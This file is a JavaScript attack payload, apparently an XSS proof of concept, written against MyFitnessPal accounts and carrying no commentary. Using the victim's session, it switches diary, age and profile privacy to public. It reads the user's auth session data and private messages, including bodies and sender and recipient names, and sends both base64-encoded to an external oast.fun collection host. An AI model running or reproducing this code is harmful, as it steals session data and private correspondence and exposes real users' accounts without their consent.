fetch('https://www.myfitnesspal.com/api/services/account/diary_settings', {
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/account/diary-settings',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0'
    },
    body: JSON.stringify({
      "tracked_nutrients": [
        { "nutrient_name_id": 1, "position": 1, "display_name": "Calories", "field_name": "calories" },
        { "nutrient_name_id": 10 },
        { "nutrient_name_id": 2 },
        { "nutrient_name_id": 13 },
        { "nutrient_name_id": 8 },
        { "nutrient_name_id": 12 }
      ],
      "meal_names": [
        { "description": "Breakfast" },
        { "description": "Lunch" },
        { "description": "Dinner" },
        { "description": "Snacks" },
        { "description": "" },
        { "description": "" }
      ],
      "preference": {
        "allow_negative_calorie_adjustment": false,
        "diary_privacy_setting": "public",
        "diary_password": "",
        "display_diary_meal_macros": true,
        "default_food_view": "recent"
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));



  fetch('https://www.myfitnesspal.com/api/services/users', {
    method: 'PATCH',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Captcha-Token': 'undefined',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/fr/account/profile-privacy',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
    },
    body: JSON.stringify({
      "item": {
        "privacy_preferences": {
          "age_visibility": "public",
          "profile_visibility": "public"
        }
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
  
  

  fetch('https://www.myfitnesspal.com/api/services/users', {
    method: 'PATCH',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Captcha-Token': 'undefined',
      'Origin': 'https://www.myfitnesspal.com',
      'Referer': 'https://www.myfitnesspal.com/fr/account/profile-privacy',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
    },
    body: JSON.stringify({
      "item": {
        "privacy_preferences": {
          "age_visibility": "public",
          "profile_visibility": "public"
        }
      }
    })
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));

  fetch('https://www.myfitnesspal.com/api/auth/session', {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Referer': 'https://www.myfitnesspal.com/profile/testooogh1',
      'Content-Type': 'application/json',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'If-None-Match': 'W/"10btolj6iso7r"',
      'Priority': 'u=4'
    }
  })
  .then(response => response.json())
  .then(data => fetch("https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/?userdata="+btoa(JSON.stringify(data, null, 2))))
  .catch(error => console.error('Error:', error));
  




let words=""

  fetch('https://www.myfitnesspal.com/_next/data/DaEGKopgl2W2VMkqohfYv/en/messages.json', {
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate, br',
      'Referer': 'https://www.myfitnesspal.com/messages',
      'X-Nextjs-Data': '1',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Priority': 'u=0',
      'Te': 'trailers'
    }
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      // Initialize an array to hold the collected elements
      const collectedElements = [];
  
      // Recursive function to find the specified elements
      function collectElements(obj) {
        if (typeof obj === 'object' && obj !== null) {
          if (Array.isArray(obj)) {
            // If obj is an array, iterate through each element
            obj.forEach(item => collectElements(item));
          } else {
            // Check if the object has the desired properties
            const { id, created_at, read_at, subject, body, from_user_id, from_username, to_user_id, to_username } = obj;
            if (id || created_at || read_at || subject || body || from_user_id || from_username || to_user_id || to_username) {
              collectedElements.push({ id, created_at, read_at, subject, body, from_user_id, from_username, to_user_id, to_username });
            }
            // Recur for all properties of the object
            for (const key in obj) {
              collectElements(obj[key]);
            }
          }
        }
      }
  
      // Start the recursive collection with the top-level data
      collectElements(data);
  
      // Log the collected elements
      collectedElements.forEach((e)=>{
        if(e.body){
        const jsonString = JSON.stringify(e, null, 2);
        words+=jsonString+"\n"
        }else{
          console.log("none")
        }
      })
      //console.log(collectedElements[0]);
      fetch("https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/user_messages="+btoa(words))
    })
    .catch(error => console.error('Error:', error));
  
